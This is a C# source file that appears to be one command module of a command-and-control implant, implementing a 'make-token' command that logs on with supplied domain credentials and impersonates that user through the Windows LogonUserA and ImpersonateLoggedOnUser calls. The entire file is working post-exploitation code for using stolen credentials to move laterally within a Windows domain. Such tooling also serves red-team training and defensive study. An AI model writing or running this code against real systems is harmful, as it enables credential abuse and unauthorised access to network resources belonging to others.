using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    internal class MakeToken : AgentCommand
    {
        public override string Name => "make-token";

        public override string Execute(AgentTask task)
        {
            // make-token DOMAIN\Username Password
            var userDomain = task.Arguments[0];
            var password = task.Arguments[1];

            var split = userDomain.Split('\\');
            var domain = split[0];
            var username = split[1];

            IntPtr hToken = IntPtr.Zero;
            if (Native.Advapi.LogonUserA(username, domain, password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    return $"Successfully impersonated {identity.Name}";
                }

                return $"Successfully made token, but failed to impersonate";
            }

            return "Failed to make token";
        }
    }
}
